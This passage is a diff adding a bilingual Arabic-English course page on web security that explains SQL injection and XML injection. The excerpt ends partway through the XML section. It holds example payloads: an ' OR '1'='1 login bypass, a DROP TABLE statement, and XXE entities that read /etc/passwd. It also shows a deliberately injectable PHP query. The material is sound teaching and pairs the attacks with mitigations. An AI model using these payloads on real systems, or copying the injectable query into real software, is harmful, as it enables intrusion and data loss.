@@ -1,0 +1,1745 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl" data-theme="dark" data-subject="IT478" data-module="12" data-no-videos>
+<head>
+
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
+  <title>أمن الويب، الاختراق الأخلاقي واختبار الاختراق · IT478 · الحديقة الرقمية</title>
+
+  <!-- Anti-flash: MUST be first script -->
+  <script>
+    (function(){
+      var t=localStorage.getItem('garden_theme')||'dark';
+      document.documentElement.setAttribute('data-theme',t);
+      var l=localStorage.getItem('garden_lang')||'ar';
+      document.documentElement.setAttribute('lang',l);
+      document.documentElement.setAttribute('dir',l==='ar'?'rtl':'ltr');
+    })();
+  </script>
+
+  <script src="../../shared/subject-tint.js"></script>
+  <!-- garden-fontpath -->
+  <link rel="stylesheet" href="../../shared/vendor/fonts/garden/garden-core.css">
+  <!-- /garden-fontpath -->
+  <link rel="stylesheet" href="../../shared/garden.css">
+  <link rel="stylesheet" href="../../shared/garden-header.css">
+  <link rel="stylesheet" href="../../shared/skin.css">
+  <link rel="stylesheet" href="../../shared/vendor/fontawesome/css/garden-icons.css">
+
+  <!-- MathJax: ONLY include if json.concepts has ANY formula with latex !== null -->
+  <script>MathJax={tex:{inlineMath:[['$','$'],['\\(','\\)']]},chtml:{displayAlign:'left'}};</script>
+  <script id="MathJax-script" data-src="../../shared/vendor/mathjax/tex-mml-chtml.js"></script>
+
+
+
+  <!-- data-garden-icons -->
+  <link rel="icon" type="image/svg+xml" href="../../shared/icons/logo-mark.svg">
+  <link rel="icon" type="image/png" sizes="32x32" href="../../shared/icons/favicon-32.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="../../shared/icons/favicon-16.png">
+  <link rel="apple-touch-icon" href="../../shared/icons/apple-touch-icon.png">
+  <link rel="manifest" href="../../manifest.json">
+  <meta name="theme-color" content="#1f2937">
+  <!-- /data-garden-icons -->
+<!--garden-ga-->
+<!-- Google Analytics -->
+  <script async src="https://www.googletagmanager.com/gtag/js?id=G-HGTK36LR0M"></script>
+  <script>
+    window.dataLayer = window.dataLayer || [];
+    function gtag(){dataLayer.push(arguments);}
+    gtag('js', new Date());
+    gtag('config', 'G-HGTK36LR0M');
+  </script>
+<!--/garden-ga-->
+</head>
+<body data-page-title="IT478" data-page-title-en="IT478">
+
+<div class="reading-progress"></div>
+<div class="page-layout">
+
+<header data-gh data-gh-variant="module" data-gh-up="index.html" data-gh-prev="M11.html" data-gh-next="index.html" data-gh-card="../../hub/course.html?code=IT478"></header>
+
+<div class="content-wrapper">
+  <aside class="sidebar">
+    <div class="sidebar-title" data-i18n="toc.title">محتويات الوحدة</div>
+    <nav class="toc-list">
+      <a href="#hero" class="toc-link" data-bilingual>
+        <template class="content-ar">مقدمة الوحدة</template>
+        <template class="content-en">Module Intro</template>
+        <span class="content-target">مقدمة الوحدة</span>
+      </a>
+      <a href="#objectives" class="toc-link" data-bilingual>
+        <template class="content-ar">أهداف التعلم</template>
+        <template class="content-en">Learning Objectives</template>
+        <span class="content-target">أهداف التعلم</span>
+      </a>
+
+      <a href="#sql-injection" class="toc-link" data-bilingual>
+        <template class="content-ar">حقن لغة الاستعلام المهيكلة (SQL Injection)</template>
+        <template class="content-en">SQL Injection</template>
+        <span class="content-target">حقن لغة الاستعلام المهيكلة (SQL Injection)</span>
+      </a>
+      <a href="#xml-injection" class="toc-link" data-bilingual>
+        <template class="content-ar">حقن لغة التوصيف الموسعة (XML Injection)</template>
+        <template class="content-en">XML Injection</template>
+        <span class="content-target">حقن لغة التوصيف الموسعة (XML Injection)</span>
+      </a>
+      <a href="#library-bloat" class="toc-link" data-bilingual>
+        <template class="content-ar">تضخم المكتبات (Library Bloat)</template>
+        <template class="content-en">Library Bloat</template>
+        <span class="content-target">تضخم المكتبات (Library Bloat)</span>
+      </a>
+      <a href="#ethical-hacking" class="toc-link" data-bilingual>
+        <template class="content-ar">الاختراق الأخلاقي (Ethical Hacking)</template>
+        <template class="content-en">Ethical Hacking</template>
+        <span class="content-target">الاختراق الأخلاقي (Ethical Hacking)</span>
+      </a>
+      <a href="#cross-site-scripting" class="toc-link" data-bilingual>
+        <template class="content-ar">البرمجة عبر المواقع (Cross Site Scripting - XSS/CSS)</template>
+        <template class="content-en">Cross Site Scripting (XSS/CSS)</template>
+        <span class="content-target">البرمجة عبر المواقع (Cross Site Scripting - XSS/CSS)</span>
+      </a>
+
+      <div class="toc-divider"></div>
+
+      <a href="#professor" class="toc-link" data-bilingual>
+        <template class="content-ar">حديث البروفيسور</template>
+        <template class="content-en">Professor's Narrative</template>
+        <span class="content-target">حديث البروفيسور</span>
+      </a>
+      <a href="#ask-professor" class="toc-link" data-bilingual>
+        <template class="content-ar">اسأل البروفيسور</template>
+        <template class="content-en">Ask the Professor</template>
+        <span class="content-target">اسأل البروفيسور</span>
+      </a>
+      <a href="#flashcards" class="toc-link" data-bilingual>
+        <template class="content-ar">البطاقات التعليمية</template>
+        <template class="content-en">Flashcards</template>
+        <span class="content-target">البطاقات التعليمية</span>
+      </a>
+      <a href="#quiz" class="toc-link" data-bilingual>
+        <template class="content-ar">اختبر نفسك</template>
+        <template class="content-en">Self Quiz</template>
+        <span class="content-target">اختبر نفسك</span>
+      </a>
+      <a href="#vault" class="toc-link" data-bilingual>
+        <template class="content-ar">خزنة الامتحان</template>
+        <template class="content-en">Exam Vault</template>
+        <span class="content-target">خزنة الامتحان</span>
+      </a>
+    </nav>
+    <div class="sidebar-widget">
+      <div class="widget-number" id="fc-due-count">0</div>
+      <div class="widget-label" data-i18n="fc.due">بطاقة للمراجعة اليوم</div>
+    </div>
+  </aside>
+
+  <main class="main-content">
+
+<section id="hero" class="hero fade-up">
+  <div class="hero-eyebrow font-display">
+    ⬡ <span data-bilingual>
+      <template class="content-ar">الوحدة 12</template>
+      <template class="content-en">Module 12</template>
+      <span class="content-target">الوحدة 12</span>
+    </span> · IT478
+  </div>
+  <div data-bilingual>
+    <template class="content-ar">
+      <h1 class="text-gradient">أمن الويب، الاختراق الأخلاقي واختبار الاختراق</h1>
+      <p class="hero-description">تغطي هذه الوحدة الثغرات الأمنية الشائعة في تطبيقات الويب مثل حقن SQL، وحقن XML، والبرمجة عبر المواقع (XSS)، بالإضافة إلى مفاهيم تضخم المكتبات والاختراق الأخلاقي.</p>
+    </template>
+    <template class="content-en">
+      <h1 class="text-gradient">Web Security, Ethical Hacking and Penetration Testing</h1>
+      <p class="hero-description">This module covers common web application vulnerabilities such as SQL Injection, XML Injection, and Cross Site Scripting (XSS), along with concepts of library bloat and ethical hacking.</p>
+    </template>
+    <div class="content-target"></div>
+  </div>
+  <div class="tag-list" data-bilingual>
+    <template class="content-ar">
+      <span class="tag">أمن الويب</span>
+      <span class="tag">حقن SQL</span>
+      <span class="tag">حقن XML</span>
+      <span class="tag">البرمجة عبر المواقع</span>
+      <span class="tag">الاختراق الأخلاقي</span>
+      <span class="tag tag--accent"><i class="fa-regular fa-clock"></i> 35 دقيقة</span>
+    </template>
+    <template class="content-en">
+      <span class="tag">Web Security</span>
+      <span class="tag">SQL Injection</span>
+      <span class="tag">XML Injection</span>
+      <span class="tag">XSS</span>
+      <span class="tag">Ethical Hacking</span>
+      <span class="tag tag--accent"><i class="fa-regular fa-clock"></i> 35 min</span>
+    </template>
+    <div class="content-target"></div>
+  </div>
+</section>
+
+<section id="objectives" class="objectives-card glass-card fade-up">
+  <h2><i class="fa-solid fa-bullseye sec-icon" aria-hidden="true"></i> <span data-i18n="obj.title">أهداف التعلم</span></h2>
+  <ul class="objectives-list" data-bilingual>
+    <template class="content-ar">
+      <li><span class="obj-icon">✦</span><span>مناقشة اختبار اختراق تطبيقات الويب والاختراق الأخلاقي.</span></li>
+      <li><span class="obj-icon">✦</span><span>مناقشة اختبار الاختراق المتقدم، وكتابة الاستغلال، والاختراق الأخلاقي.</span></li>
+      <li><span class="obj-icon">✦</span><span>عرض أدوات وتقنيات القراصنة، والاستغلالات، والتعامل مع الحوادث.</span></li>
+      <li><span class="obj-icon">✦</span><span>فهم أمن الأجهزة المحمولة والاختراق الأخلاقي.</span></li>
+    </template>
+    <template class="content-en">
+      <li><span class="obj-icon">✦</span><span>Discuss the Web App Penetration Testing and Ethical Hacking.</span></li>
+      <li><span class="obj-icon">✦</span><span>Discuss advanced Penetration Testing, Exploit Writing, and Ethical Hacking.</span></li>
+      <li><span class="obj-icon">✦</span><span>Present Hacker Tools, Techniques, Exploits, and Incident Handling.</span></li>
+      <li><span class="obj-icon">✦</span><span>Understand Mobile Device Security and Ethical Hacking.</span></li>
+    </template>
+    <div class="content-target"></div>
+  </ul>
+</section>
+
+<section id="sql-injection" class="concept-card glass-card fade-up">
+  <div class="concept-header" data-bilingual>
+    <template class="content-ar"><h2><span class="concept-number">1</span> حقن لغة الاستعلام المهيكلة (SQL Injection)</h2></template>
+    <template class="content-en"><h2><span class="concept-number">1</span> SQL Injection</h2></template>
+    <div class="content-target"></div>
+  </div>
+
+  <div class="depth-tabs">
+    <button class="depth-tab active" data-layer="flash"><i class="fa-solid fa-bolt" aria-hidden="true"></i> <span data-i18n="layer.flash">سريع</span></button>
+    <button class="depth-tab" data-layer="full"><i class="fa-solid fa-book-open" aria-hidden="true"></i> <span data-i18n="layer.full">كامل</span></button>
+    <button class="depth-tab" data-layer="deep"><i class="fa-solid fa-microscope" aria-hidden="true"></i> <span data-i18n="layer.deep">عميق</span></button>
+  </div>
+
+  <div class="depth-layer active" data-layer="flash" data-bilingual>
+    <template class="content-ar"><p>ثغرة أمنية في الويب تسمح للمهاجم بالتدخل في الاستعلامات التي يجريها التطبيق على قاعدة بياناته.</p><p><b>تشبيه:</b> كأن تعطي حارس الأمن اسماً يحتوي على أمر سري يجعله يفتح جميع الأبواب بدلاً من التحقق من هويتك فقط.</p></template>
+    <template class="content-en"><p>A web security vulnerability that allows an attacker to interfere with the queries that an application makes to its database.</p><p><b>Analogy:</b> Like giving a security guard a name that includes a secret command causing them to open all doors instead of just checking your ID.</p></template>
+    <div class="content-target"></div>
+  </div>
+  <div class="depth-layer" data-layer="full" data-bilingual>
+    <template class="content-ar"><p>تحدث هجمات <span class="smart-term" data-term-en="SQL Injection" data-ar="حقن SQL" data-en-def="A vulnerability allowing attackers to interfere with database queries.">حقن SQL<span class="smart-term-tooltip"></span></span> عندما تأخذ تطبيقات الويب مدخلات المستخدم من نموذج وتستخدمها حرفياً في بناء استعلام SQL يتم إرساله إلى قاعدة البيانات. يتضمن الهجوم وضع عبارات SQL داخل مدخلات المستخدم.</p><p><b>بناء الجملة الهام (Syntax):</b></p><ul><li><b>التعليقات:</b> <code>--</code> (مثال: <code>SELECT * FROM `table` --selects everything</code>)</li><li><b>المنطق:</b> <code>'a'='a'</code> (مثال: <code>SELECT * FROM `table` WHERE 'a'='a'</code>)</li><li><b>العبارات المتعددة:</b> <code>S1; S2</code> (مثال: <code>SELECT * FROM `table`; DROP TABLE `table`;</code>)</li></ul><p><b>خطوات الهجوم:</b></p><ol><li>يرسل التطبيق النموذج للمستخدم.</li><li>يقدم المهاجم النموذج مع بيانات استغلال SQL.</li><li>يبني التطبيق السلسلة النصية مع بيانات الاستغلال.</li><li>يرسل التطبيق استعلام SQL إلى قاعدة البيانات.</li><li>تنفذ قاعدة البيانات الاستعلام، بما في ذلك الاستغلال، وترسل البيانات مرة أخرى للتطبيق.</li><li>يعيد التطبيق البيانات للمستخدم.</li></ol><p><b>مثال على تجاوز المصادقة (Login Authentication):</b></p><p>الاستعلام القياسي: <code>select * from users where user='$usern' AND pwd='$password'</code></p><p>إذا أدخل المهاجم سلاسل خاصة، يصبح الاستعلام: <code>select * from users where user='M' OR '1=1' AND pwd='M' OR '1=1'</code>. النتيجة هي الحصول على الوصول بدون كلمة مرور.</p></template>
+    <template class="content-en"><p><span class="smart-term" data-term-en="SQL Injection" data-ar="حقن SQL" data-en-def="A vulnerability allowing attackers to interfere with database queries.">SQL injection<span class="smart-term-tooltip"></span></span> attacks occur when web applications take user input from a form and use it literally in the construction of an SQL query submitted to a database. The attack involves placing SQL statements in the user input.</p><p><b>Important Syntax:</b></p><ul><li><b>Comments:</b> <code>--</code> (Example: <code>SELECT * FROM `table` --selects everything</code>)</li><li><b>Logic:</b> <code>'a'='a'</code> (Example: <code>SELECT * FROM `table` WHERE 'a'='a'</code>)</li><li><b>Multi Statements:</b> <code>S1; S2</code> (Example: <code>SELECT * FROM `table`; DROP TABLE `table`;</code>)</li></ul><p><b>Attack Steps:</b></p><ol><li>App sends form to user.</li><li>Attacker submits form with SQL exploit data.</li><li>Application builds string with exploit data.</li><li>Application sends SQL query to DB.</li><li>DB executes query, including exploit, sends data back to application.</li><li>Application returns data to user.</li></ol><p><b>Login Authentication Bypass Example:</b></p><p>Standard query: <code>select * from users where user='$usern' AND pwd='$password'</code></p><p>If the attacker enters special strings, the query becomes: <code>select * from users where user='M' OR '1=1' AND pwd='M' OR '1=1'</code>. Result: access obtained without password.</p></template>
+    <div class="content-target"></div>
+  </div>
+  <div class="depth-layer" data-layer="deep" data-bilingual>
+    <template class="content-ar"><p>السبب الجذري لحقن SQL هو الفشل في فصل مستوى البيانات (Data Plane) عن مستوى التحكم (Control Plane). عندما يتم دمج مدخلات المستخدم مباشرة في سلسلة الاستعلام، يفسر محرك قاعدة البيانات المدخلات كأوامر قابلة للتنفيذ بدلاً من بيانات مجردة.</p><p>استخدام التعليقات <code>--</code> يسمح للمهاجم بتجاهل بقية الاستعلام الأصلي الذي صممه المطور (مثل التحقق من كلمة المرور)، بينما يسمح المنطق <code>'1=1'</code> بجعل شرط <code>WHERE</code> صحيحاً دائماً، مما يؤدي إلى إرجاع جميع السجلات.</p><p>أفضل طريقة للتخفيف من هذه الثغرة هي استخدام الاستعلامات ذات المعلمات (Parameterized Queries) أو العبارات المحضرة (Prepared Statements)، والتي تضمن معالجة المدخلات كبيانات فقط، بغض النظر عن محتواها.</p></template>
+    <template class="content-en"><p>The root cause of SQL injection is the failure to separate the data plane from the control plane. When user input is concatenated directly into a query string, the database engine interprets the input as executable commands rather than mere data.</p><p>The use of comments <code>--</code> allows an attacker to truncate the rest of the original query designed by the developer (such as the password check), while the logic <code>'1=1'</code> forces the <code>WHERE</code> clause to evaluate to true, returning all records.</p><p>The most effective mitigation strategy is the use of Parameterized Queries or Prepared Statements, which ensure that the database treats user input strictly as data, regardless of its content.</p></template>
+    <div class="content-target"></div>
+  </div>
+
+  <div class="code-block">
+    <div class="code-block-header">
+      <span>php</span>
+      <button class="copy-btn"><i class="fa-regular fa-copy" aria-hidden="true"></i> Copy</button>
+    </div>
+    <pre><code>$query = "select count(*) from users where username = '$username' and password = '$password'";
+$result = @mysqli_query($dbc, $query);</code></pre>
+  </div>
+
+  <!-- DIAGRAM[1]: Detailed SVG generation prompt: Flowchart showing the 6 steps of an SQL Injection attack. Start with 'App sends form' -> 'Attacker submits exploit' -> 'App builds string' -> 'App sends query to DB' -> 'DB executes exploit and returns data' -> 'App returns data to user'. Use a dark background #0d1117, accent color #ff5555 for the exploit path. Include database cylinder icon and user/attacker icons. Arabic + English labels. -->
+<div class="svg-diagram" data-diagram-id="1">
+<svg viewBox="0 0 800 650" width="100%" height="auto" preserveAspectRatio="xMidYMid meet" xmlns="http://www.w3.org/2000/svg" font-family="system-ui, 'Cairo', 'Inter', sans-serif">
+    <defs>
+        <marker id="arrow-normal" viewBox="0 0 10 10" refX="9" refY="5" markerWidth="6" markerHeight="6" orient="auto-start-reverse">
+            <path d="M 0 0 L 10 5 L 0 10 z" fill="var(--text-secondary)" />
+        </marker>
+        <marker id="arrow-exploit" viewBox="0 0 10 10" refX="9" refY="5" markerWidth="6" markerHeight="6" orient="auto-start-reverse">
+            <path d="M 0 0 L 10 5 L 0 10 z" fill="var(--brand-500)" />
+        </marker>
+    </defs>
+
+    <!-- Background -->
+    <rect width="100%" height="100%" fill="var(--bg-surface)" />
+
+    <!-- Lifelines -->
+    <line x1="150" y1="90" x2="150" y2="620" stroke="var(--border-color)" stroke-width="2" stroke-dasharray="6,6" />
+    <line x1="400" y1="90" x2="400" y2="620" stroke="var(--border-color)" stroke-width="2" stroke-dasharray="6,6" />
+    <line x1="650" y1="90" x2="650" y2="620" stroke="var(--border-color)" stroke-width="2" stroke-dasharray="6,6" />
+
+    <!-- Headers -->
+    <!-- Attacker -->
+    <rect x="80" y="20" width="140" height="70" rx="8" fill="var(--bg-elevated)" stroke="var(--border-color)" stroke-width="2" />
+    <g transform="translate(138, 28)" fill="none" stroke="var(--brand-500)" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+        <path d="M16 21v-2a4 4 0 0 0-4-4H5a4 4 0 0 0-4 4v2"></path>
+        <circle cx="8.5" cy="7" r="4"></circle>
+        <line x1="18" y1="8" x2="23" y2="13"></line>
+        <line x1="23" y1="8" x2="18" y2="13"></line>
+    </g>
+    <text x="150" y="78" text-anchor="middle" font-size="18" font-weight="bold" fill="var(--text-primary)" class="gsvg-en">Attacker</text>
+    <text x="150" y="78" text-anchor="middle" font-size="18" font-weight="bold" fill="var(--text-primary)" class="gsvg-ar">المهاجم</text>
+
+    <!-- Web App -->
+    <rect x="330" y="20" width="140" height="70" rx="8" fill="var(--bg-elevated)" stroke="var(--border-color)" stroke-width="2" />
+    <g transform="translate(388, 28)" fill="none" stroke="var(--text-primary)" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+        <rect x="2" y="2" width="20" height="14" rx="2" ry="2"></rect>
+        <line x1="8" y1="20" x2="16" y2="20"></line>
+        <line x1="12" y1="16" x2="12" y2="20"></line>
+    </g>
+    <text x="400" y="78" text-anchor="middle" font-size="18" font-weight="bold" fill="var(--text-primary)" class="gsvg-en">Web App</text>
+    <text x="400" y="78" text-anchor="middle" font-size="18" font-weight="bold" fill="var(--text-primary)" class="gsvg-ar">تطبيق الويب</text>
+
+    <!-- Database -->
+    <rect x="580" y="20" width="140" height="70" rx="8" fill="var(--bg-elevated)" stroke="var(--border-color)" stroke-width="2" />
+    <g transform="translate(638, 26)" fill="none" stroke="var(--text-primary)" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+        <ellipse cx="12" cy="6" rx="9" ry="4"></ellipse>
+        <path d="M21 12c0 2.2-4 4-9 4s-9-1.8-9-4"></path>
+        <path d="M3 6v12c0 2.2 4 4 9 4s9-1.8 9-4V6"></path>
+    </g>
+    <text x="650" y="78" text-anchor="middle" font-size="18" font-weight="bold" fill="var(--text-primary)" class="gsvg-en">Database</text>
+    <text x="650" y="78" text-anchor="middle" font-size="18" font-weight="bold" fill="var(--text-primary)" class="gsvg-ar">قاعدة البيانات</text>
+
+    <!-- Step 1: App sends form -->
+    <text x="275" y="130" text-anchor="middle" font-size="15" fill="var(--text-secondary)" class="gsvg-en">1. App sends login form</text>
+    <text x="275" y="130" text-anchor="middle" font-size="15" fill="var(--text-secondary)" class="gsvg-ar">1. التطبيق يرسل نموذج تسجيل الدخول</text>
+    <line x1="400" y1="140" x2="160" y2="140" stroke="var(--text-secondary)" stroke-width="2" marker-end="url(#arrow-normal)" />
+
+    <!-- Step 2: Attacker submits exploit -->
+    <text x="275" y="210" text-anchor="middle" font-size="15" font-weight="bold" fill="var(--brand-ink)" class="gsvg-en">2. Attacker submits exploit</text>
+    <text x="275" y="210" text-anchor="middle" font-size="15" font-weight="bold" fill="var(--brand-ink)" class="gsvg-ar">2. المهاجم يرسل الاستغلال</text>
+    <line x1="150" y1="220" x2="390" y2="220" stroke="var(--brand-500)" stroke-width="3" marker-end="url(#arrow-exploit)" />
+    
+    <rect x="215" y="230" width="120" height="28" rx="4" fill="var(--bg-elevated)" stroke="var(--border-color)" stroke-width="1" />
+    <text x="275" y="249" text-anchor="middle" font-size="13" font-family="monospace" fill="var(--brand-ink)">' OR '1'='1</text>
+
+    <!-- Step 3: App builds string -->
+    <path d="M 400 280 C 470 280, 470 330, 410 330" fill="none" stroke="var(--brand-500)" stroke-width="3" marker-end="url(#arrow-exploit)" />
+    <text x="540" y="300" text-anchor="middle" font-size="15" font-weight="bold" fill="var(--brand-ink)" class="gsvg-en">3. App builds string</text>
+    <text x="540" y="300" text-anchor="middle" font-size="15" font-weight="bold" fill="var(--brand-ink)" class="gsvg-ar">3. التطبيق يبني النص</text>
+    <text x="540" y="320" text-anchor="middle" font-size="13" fill="var(--text-muted)" class="gsvg-en">Injects payload into query</text>
+    <text x="540" y="320" text-anchor="middle" font-size="13" fill="var(--text-muted)" class="gsvg-ar">يحقن الحمولة في الاستعلام</text>
+
+    <!-- Step 4: App sends query to DB -->
+    <text x="525" y="390" text-anchor="middle" font-size="15" font-weight="bold" fill="var(--brand-ink)" class="gsvg-en">4. App sends query to DB</text>
+    <text x="525" y="390" text-anchor="middle" font-size="15" font-weight="bold" fill="var(--brand-ink)" class="gsvg-ar">4. التطبيق يرسل الاستعلام لقاعدة البيانات</text>
+    <line x1="400" y1="400" x2="640" y2="400" stroke="var(--brand-500)" stroke-width="3" marker-end="url(#arrow-exploit)" />
+    
+    <rect x="345" y="410" width="360" height="28" rx="4" fill="var(--bg-elevated)" stroke="var(--border-color)" stroke-width="1" />
+    <text x="525" y="429" text-anchor="middle" font-size="13" font-family="monospace" fill="var(--brand-ink)">SELECT * FROM users WHERE user='' OR '1'='1'</text>
+
+    <!-- Step 5: DB executes & returns data -->
+    <text x="525" y="480" text-anchor="middle" font-size="15" font-weight="bold" fill="var(--brand-ink)" class="gsvg-en">5. DB executes &amp; returns data</text>
+    <text x="525" y="480" text-anchor="middle" font-size="15" font-weight="bold" fill="var(--brand-ink)" class="gsvg-ar">5. قاعدة البيانات تنفذ وترجع البيانات</text>
+    <line x1="650" y1="490" x2="410" y2="490" stroke="var(--brand-500)" stroke-width="3" marker-end="url(#arrow-exploit)" />
+    <text x="525" y="510" text-anchor="middle" font-size="13" fill="var(--text-muted)" class="gsvg-en">Returns all user records</text>
+    <text x="525" y="510" text-anchor="middle" font-size="13" fill="var(--text-muted)" class="gsvg-ar">ترجع جميع سجلات المستخدمين</text>
+
+    <!-- Step 6: App returns data to user -->
+    <text x="275" y="570" text-anchor="middle" font-size="15" font-weight="bold" fill="var(--brand-ink)" class="gsvg-en">6. App returns data to user</text>
+    <text x="275" y="570" text-anchor="middle" font-size="15" font-weight="bold" fill="var(--brand-ink)" class="gsvg-ar">6. التطبيق يرجع البيانات للمستخدم</text>
+    <line x1="400" y1="580" x2="160" y2="580" stroke="var(--brand-500)" stroke-width="3" marker-end="url(#arrow-exploit)" />
+    
+    <rect x="175" y="590" width="200" height="28" rx="4" fill="var(--brand-500)" />
+    <text x="275" y="609" text-anchor="middle" font-size="13" font-weight="bold" fill="var(--on-brand-lo)" class="gsvg-en">Authentication Bypassed!</text>
+    <text x="275" y="609" text-anchor="middle" font-size="13" font-weight="bold" fill="var(--on-brand-lo)" class="gsvg-ar">تم تخطي المصادقة بنجاح!</text>
+</svg>
+</div>
+
+  <details class="thinking-question">
+    <summary data-bilingual>
+      <template class="content-ar">لماذا يعتبر استخدام التعليقات (--) في نهاية حمولة حقن SQL تكتيكاً شائعاً؟</template>
+      <template class="content-en">Why is using comments (--) at the end of an SQL injection payload a common tactic?</template>
+      <span class="content-target"></span>
+    </summary>
+    <div data-bilingual>
+      <template class="content-ar"><p>يتم استخدامه لتجاهل أو إلغاء بقية استعلام SQL الأصلي الذي كتبه المطور (مثل التحقق من كلمة المرور)، مما يضمن تنفيذ الجزء المحقون فقط دون حدوث أخطاء في بناء الجملة.</p></template>
+      <template class="content-en"><p>It is used to comment out or ignore the remainder of the original SQL query written by the developer (like the password check), ensuring only the injected part executes without syntax errors.</p></template>
+      <div class="content-target"></div>
+    </div>
+  </details>
+</section>
+
+<section id="xml-injection" class="concept-card glass-card fade-up">
+  <div class="concept-header" data-bilingual>
+    <template class="content-ar"><h2><span class="concept-number">2</span> حقن لغة التوصيف الموسعة (XML Injection)</h2></template>
+    <template class="content-en"><h2><span class="concept-number">2</span> XML Injection</h2></template>
+    <div class="content-target"></div>
+  </div>
+
+  <div class="depth-tabs">
+    <button class="depth-tab active" data-layer="flash"><i class="fa-solid fa-bolt" aria-hidden="true"></i> <span data-i18n="layer.flash">سريع</span></button>
+    <button class="depth-tab" data-layer="full"><i class="fa-solid fa-book-open" aria-hidden="true"></i> <span data-i18n="layer.full">كامل</span></button>
+    <button class="depth-tab" data-layer="deep"><i class="fa-solid fa-microscope" aria-hidden="true"></i> <span data-i18n="layer.deep">عميق</span></button>
+  </div>
+
+  <div class="depth-layer active" data-layer="flash" data-bilingual>
+    <template class="content-ar"><p>تقنية هجوم تستخدم للتلاعب أو اختراق منطق تطبيق يعتمد على XML عن طريق حقن محتوى غير مقصود.</p><p><b>تشبيه:</b> كأن ترسل رسالة بريدية تحتوي على تعليمات لموظف البريد بتسليمك نسخاً من رسائل الآخرين بدلاً من مجرد قراءة رسالتك.</p></template>
+    <template class="content-en"><p>An attack technique used to manipulate or compromise the logic of an XML application or service by injecting unintended XML content.</p><p><b>Analogy:</b> Like sending a mail package that contains instructions for the postal worker to hand you copies of everyone else's mail instead of just reading your letter.</p></template>
+    <div class="content-target"></div>
+  </div>
+  <div class="depth-layer" data-layer="full" data-bilingual>
+    <template class="content-ar"><p>تكون محللات XML (XML parsers) التي تحتوي على أخطاء أو مهيأة بشكل خاطئ عرضة لنوعين رئيسيين من الهجمات:</p><ol><li><b>قنابل XML (XML Bombs):</b> قد يتعطل محلل XML أو ينفذ بشكل غير صحيح عند إعطائه بيانات إدخال معينة، مما يؤدي إلى هجوم حجب الخدمة (DoS). يمكن أن يكون ملف XML صالحاً ولكنه مصمم لتعليق أو تعطل التطبيق.</li><li><b><span class="smart-term" data-term-en="XXE" data-ar="إفشاء الكيانات الخارجية" data-en-def="An attack that forces an XML parser to process external entities, leaking data.">إفشاء الكيانات الخارجية<span class="smart-term-tooltip"></span></span> (XXE Disclosure):</b> قد يقوم محلل XML بتسريب معلومات حساسة عن غير قصد. يحدث هذا عندما يقبل التطبيق XML من مصادر غير موثوقة ويقوم بتحليل الكيانات الخارجية.</li></ol><p><b>أمثلة على XXE:</b></p><ul><li><code>&lt;!ENTITY xxe SYSTEM "file:///dev/random" &gt;</code></li><li><code>&lt;!ENTITY xxe SYSTEM "file:///etc/passwd" &gt;</code></li></ul><p><b>طرق التخفيف (Mitigation):</b></p><ul><li><b>لقنابل XML:</b> تكوين محلل XML لتعطيل التوسع المضمن للكيانات (disable inline expansion of entities).</li><li><b>لـ XXE:</b> تكوين محلل XML لتجنب حل المراجع الخارجية تماماً.</li></ul></template>
+    <template class="content-en"><p>XML parsers with bugs or misconfigurations are generally susceptible to two main kinds of attacks:</p><ol><li><b><span class="smart-term" data-term-en="XML Bomb" data-ar="قنبلة XML" data-en-def="A well-formed XML document designed to crash the parser via entity expansion.">XML Bomb<span class="smart-term-tooltip"></span></span>s:</b> The XML parser may crash or execute incorrectly given certain input data, resulting in a Denial of Service (DoS) attack. An XML Bomb may be well-formed and valid XML, but designed to cause the parser to hang or crash.</li><li><b><span class="smart-term" data-term-en="XXE" data-ar="إفشاء الكيانات الخارجية" data-en-def="An attack that forces an XML parser to process external entities, leaking data.">XXE<span class="smart-term-tooltip"></span></span> Disclosure (XML External Entity):</b> The XML parser may inadvertently leak sensitive information. This happens when an application accepts XML directly from untrusted sources and parses external entities.</li></ol><p><b>XXE Examples:</b></p><ul><li><code>&lt;!ENTITY xxe SYSTEM "file:///dev/random" &gt;</code></li><li><code>&lt;!ENTITY xxe SYSTEM "file:///etc/passwd" &gt;</code></li></ul><p><b>Mitigation Strategies:</b></p><ul><li><b>For XML Bombs:</b> Configure the XML parser to disable inline expansion of entities.</li><li><b>For XXE:</b> Configure the XML parser to avoid resolving external references entirely.</li></ul></template>
+    <div class="content-target"></div>
+  </div>
+  <div class="depth-layer" data-layer="deep" data-bilingual>
+    <template class="content-ar"><p>تستغل قنابل XML (مثل هجوم Billion Laughs) ميزة التوسع المضمن للكيانات لاستهلاك كميات هائلة من الذاكرة أو وحدة المعالجة المركزية، حيث يتم تعريف كيان صغير يشير إلى كيانات أخرى بشكل متكرر، مما يؤدي إلى نمو أسي عند التحليل.</p><p>تستغل هجمات XXE قدرة محللات XML القديمة أو غير المهيأة بشكل آمن على جلب محتوى من مسارات النظام المحلية (مثل <code>/etc/passwd</code>) أو عناوين URL خارجية. يمكن استخدام هذا ليس فقط لسرقة البيانات، بل أيضاً لتنفيذ طلبات تزوير من جانب الخادم (SSRF).</p><p>في بيئات التطوير الحديثة، يتم تعطيل معالجة الكيانات الخارجية افتراضياً في العديد من المكتبات، ولكن يجب على المطورين التحقق من ذلك صراحةً، خاصة عند التعامل مع أنظمة قديمة (Legacy Systems).</p></template>
+    <template class="content-en"><p>XML Bombs (like the Billion Laughs attack) exploit the inline entity expansion feature to consume massive amounts of memory or CPU. A small entity is defined that repeatedly references other entities, leading to exponential geometric growth upon parsing.</p><p>XXE attacks exploit the capability of older or insecurely configured XML parsers to fetch content from local system paths (like <code>/etc/passwd</code>) or external URLs. This can be used not only for data exfiltration but also for Server-Side Request Forgery (SSRF).</p><p>In modern development environments, external entity processing is often disabled by default in many libraries, but developers must explicitly verify this, especially when integrating with legacy systems.</p></template>
+    <div class="content-target"></div>
+  </div>
+
+  <div class="code-block">
+    <div class="code-block-header">
+      <span>csharp</span>
+      <button class="copy-btn"><i class="fa-regular fa-copy" aria-hidden="true"></i> Copy</button>
+    </div>
+    <pre><code>XmlReaderSettings settings = new XmlReaderSettings();
+settings.XmlResolver = null;
+XmlReader reader = XmlReader.Create(stream, settings);</code></pre>
+  </div>
+
+  <div class="code-block">
+    <div class="code-block-header">
+      <span>php</span>
